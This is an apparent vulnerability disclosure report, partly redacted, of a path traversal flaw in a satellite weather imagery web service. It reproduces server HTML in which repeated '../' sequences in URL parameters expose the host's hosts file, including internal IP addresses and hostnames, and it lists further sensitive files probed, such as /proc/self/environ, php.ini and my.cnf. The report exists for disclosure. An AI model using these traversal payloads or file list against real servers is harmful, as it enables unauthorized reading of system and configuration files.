         <a class="youngcolormenuItem" href="██████████?ACTIVES=21-WPAC-90W.INVEST,21-SHEM-93S.INVEST,21-WPAC-99W.INVEST&AGE=Latest&A███F_BASIN=wp&A██████F_DIR=/█████/kauai_data/www/a███████f_web/public_html/docs/warnings&A█████F_NAME=wp902021&PHOT=yes&SIZE=Thumb&NAV=███&A██████████F_YR=2021&A██████F_FILE=/../../../../../../../../../../../../../../..███████/hosts&███████_FILE=/../../../../../../../../../../../../../../..█████████████████/hosts&CURRENT=20210529.033000.aqua.modis.Vapor.████2190WINVEST.covg99p6.unknown.res1km.jpg&███████=../../../../../../../../../../../../../../..███████████/hosts&MO=MAY&BASIN=WPAC&STYLE=tables&YEAR=2021&YR=21&STORM_NAME=90W.INVEST&ARCHIVE=active&AREA=pacific/southern_hemisphere&DISPLAY=Latest&DIR=/██████████/█████████/█████████21/WPAC/90W.INVEST/vapor/modis/1km&PROD=vapor&SUB_PROD=1km&TYPE=modis" TARGET="_top">1_Km</a>
       
             </DIV>
    </TH>
    <!-- End of onekm_buttons modis -->
    </TR>



    <!-- Start of onekm_buttons viirs -->

        <TH> VIIRS: </TH> <TH class="iconCell" > </TH><TH class="iconCell" > </TH><TH class="iconCell" > 
        <a class="menuButton"  onmouseover="buttonMouseover(event, 'viirs_12','sector');" ><IMG class="ballIcon" SRC="/icons/square_red_sm.jpg" title="red icon, product greater than 12 hours old." alt="red icon, product greater than 12 hours old." HEIGHT=15 WIDTH=15 BORDER=0></a>
           <div class="menuItemSep"></div> 
            <!--viirs_12 sub-menus-->

            <DIV id="viirs_12" class="menu"  onmouseover="menuMouseover(event)">
    
         <a class="oldcolormenuItem" href="█████████?ACTIVES=21-WPAC-90W.INVEST,21-SHEM-93S.INVEST,21-WPAC-99W.INVEST&AGE=Latest&A███F_BASIN=wp&A██████████F_DIR=/█████/kauai_data/www/a████f_web/public_html/docs/warnings&A█████████F_NAME=wp902021&PHOT=yes&SIZE=Thumb&NAV=███&A███████F_YR=2021&A███F_FILE=/../../../../../../../../../../../../../../..██████████████/hosts&█████_FILE=/../../../../../../../../../../../../../../..████████/hosts&CURRENT=20210529.033000.aqua.modis.Vapor.████████2190WINVEST.covg99p6.unknown.res1km.jpg&████████=../../../../../../../../../../../../../../..█████████/hosts&MO=MAY&BASIN=WPAC&STYLE=tables&YEAR=2021&YR=21&STORM_NAME=90W.INVEST&ARCHIVE=active&AREA=pacific/southern_hemisphere&DISPLAY=Latest&DIR=/██████/████████/█████21/WPAC/90W.INVEST/Night-Vis-IR/viirs/1km&PROD=Night-Vis-IR&TYPE=viirs&SUB_PROD=1km" TARGET="_top">1_Km</a>
       
             </DIV>
    </TH>
    <!-- End of onekm_buttons viirs -->
    </TR>
    <TR>


    <TR>
    <!-- Start of onekm_buttons ols -->

        <TH> OLS: </TH> <TH class="iconCell" > </TH><TH class="iconCell" > </TH><TH class="iconCell" > </TH>
    <!-- End of onekm_buttons ols -->
    </TR>

<!-- End of sector_buttons -->
</TABLE>
</DIV>

</TD></TR>
</TABLE>
        
            <!-- End of the ██████buttons row -->
        </td></tr>
        <tr><td> 
            <!-- Start of the image area -->
<TABLE border=0><TR><TH><table border=0><TR><TH >90W.INVEST,&nbsp;WARN,&nbsp;&nbsp;29 MAY 2021 0330Z </TH> <TH ALIGN="Center"><FORM NAME="clockFormGMT" ACTION="POST"><DIV class="finePrint"><INPUT TYPE="text" NAME="digits" SIZE=8 VALUE="Loading"><a href="javascript:popUp2('http://tycho.usno.█████.mil/zones.html','U█████████_Info','600','750')" title="Link to Naval Observatory's Chart converting local time to Universal Time Coordinated">U███ (Z)</a></DIV></FORM></TH></TR></table></TH><TH>
     <!-- Start of popup_info_training_buttons-->
       <DIV class="button_row">

                <DIV class="button_row_title">Tutorials: </DIV>
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton" href="javascript:popUp2('http://████/████████/display_info.cgi?INFO=████info','General_Info','600','800')" title="Button linking to Overview"   >Overview</a>
        
        </DIV>
        
            <DIV class="trainingButton">
            <a href="javascript:popUp2('http://w███████/█████████analysis/','Tutorial','700','800')" class="trainingBox" title="Link to COMET training" >COMET</a>
            </DIV>
             </DIV>
        
     <!-- End of popup_info_training_buttons-->

     </TH></TR>
     <TR><TH COLSPAN=2><CENTER>
    <table border=0>
   <tr>
    <th><img src="/icons/square_red_sm.jpg"</th><th VALIGN="middle" width="400">&nbsp;|&nbsp;../../../../../../../../../../../../../../..███████████/hosts&nbsp;|&nbsp;</th><th><img src="/icons/square_red_sm.jpg"  title="█████████." alt="████."></th></tr>
    </table>
    </CENTER></TH></TR>
    </TABLE>
<DIV class="a██████fWarn"><br>127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4
<br>::1         localhost localhost.localdomain localhost6 localhost6.localdomain6
<br>
<br>
<br>199.9.2.125 	lanaidev	lanaidev.███████████████.███.mil
<br>
<br>199.9.2.5 commvault-cs commvault-cs.██████.█████████.mil
</DIV>            <!-- End of the image area -->
        </td></tr>

        <tr><td>
            <!-- Start of page bottom cell -->
<table><tr><td>

    <center>    <DIV class="█████████">
         
    <TABLE width="620" border=0>
    <TR><TD>
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton" href="/█████.html" title="Button linking to ██████████"  TARGET = "_top"   >██████████</a>
        
        </DIV>
        
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton" href="" title="Button linking to ███"  TARGET = "_top"   >█████</a>
        
        </DIV>
        
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton" href="/██████████-bin/█████████.cgi" title="Button linking to █████████"  TARGET = "_top"   >██████████</a>
        
        </DIV>
        
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton" href="/training-bin/training.cgi" title="Button linking to Training"  TARGET = "_top"   >Training</a>
        
        </DIV>
        
        <DIV class="menuBar" style="float:left;"> 
        <a class="menuButton"   style="background: #FFFF00; color: blue;" href="" title="Button linking to ████"  TARGET = "_top"   >███████</a>
        
        </DIV>
        
    </TD></TR>
    </TABLE>
    </DIV>
    </center>
</td></tr>
         <tr><td>

        <p><center><img src="/███████/images/hbar.gif" title="horizontal bar" alt="horizontal bar" width=645 height=3 border=0></center>

        <DIV class="finePrint">
        <TABLE width="100%"> 
        <TR><TD>

       <CENTER>
       <A HREF="http://███████" TARGET="_top" title="Link to ███████ █████'s home page." ><STRONG>███ Home Page</STRONG></A>  |
       <A HREF="http://███████/search.html" TARGET="_top" title="Link to ██████ █████████'s search page." ><STRONG>Search</STRONG></A>
       </CENTER>

       </TD></TR>
       </TABLE>

       <br>
       <TABLE width="100%">
       <TR> <TD>
       <em>Page Generated: Sat May 29 20:10:30 2021 GMT<█████████m>
       <br><em>TcPage Ver:&nbsp;4.60.05w (04/23/2021)<██████████m>

       <br><em>Approved for public release by: Superintendent<█████████m>

       <br><A HREF="javascript:popUp2('/shared-bin████████mail.cgi?TO=sat_head','EMAIL','600','700')" title="Send email to the █████<█████m></A>


       <br><A HREF="javascript:popUp2('/shared-bin██████████mail.cgi?TO=webmaster','EMAIL','600','700')" title="Send email to ███ █████████ webmaster."><em>Webmaster<█████m></A>
       </TD>
       <TD align="right" valign="top">
       
       </TD></TR>
       </TABLE>
       </DIV>
</td></tr>
</table>
            <!-- End of page bottom cell -->
        </td></tr>
        </table>


        <!-- End of the █████████display cell -->
    </TH>


</TR>
</TABLE>

<!-- End of the entire page table -->

</body>
<head>
<meta http-equiv="Expires" content="+10m">
</head>
</html>
```

Several tests have been done, in several files, some of them are:

/proc/self████nviron
/proc/self/status
/proc/meminfo
/proc/cpuinfo
/proc/partitions
████████████/hosts
████████████████/php.ini
█████████████████/rpc
███████████/my.cnf
█████████████/fstab
█████████████/group
███████████████/nsswi██████h.conf
███████████████/updatedb.conf
██████████/logrotate.d/httpd
/usr/bin/curl

## Impact

It may be possible to access arbitrary files and directories stored on file system including application source code or configuration and critical system files.

## System Host(s)
██████████

## Affected Product(s) and Version(s)


## CVE Numbers


## Steps to Reproduce
1. It’s possible to insert a malicious string as the "████" parameter of the following handler to access files that are outside of the restricted directory.

## Suggested Mitigation/Remediation Actions




## Attachments
No attachments
